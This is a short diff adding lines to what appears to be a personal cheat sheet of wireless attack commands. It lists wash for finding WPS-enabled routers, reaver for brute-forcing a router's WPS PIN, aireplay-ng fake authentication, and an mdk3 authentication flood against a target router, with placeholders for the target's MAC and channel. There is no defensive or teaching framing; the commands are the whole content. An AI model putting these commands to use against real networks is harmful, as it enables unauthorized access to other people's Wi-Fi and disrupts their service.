@@ -6,3 +6,13 @@ cd Applications; sudo ./reaver --bssid #RouterMAC --channel #Number --interface 
 #Lower Terminal
 sudo aireplay-ng --fakeauth 30 -a #RouterMAC -h #InterfaceMAC wlan1
 
+##############################################################################################################
+
+
+wash -i wlan1
+
+reaver --bssid #RouterMAC --channel #RouterChannel -i wlan1 -A -N
+
+aireplay-ng --fakeauth 300 -a # -h c8:3a:35:c7:06:4e wlan1
+
+mdk3 wlan1 a -a #TargetRouter -m
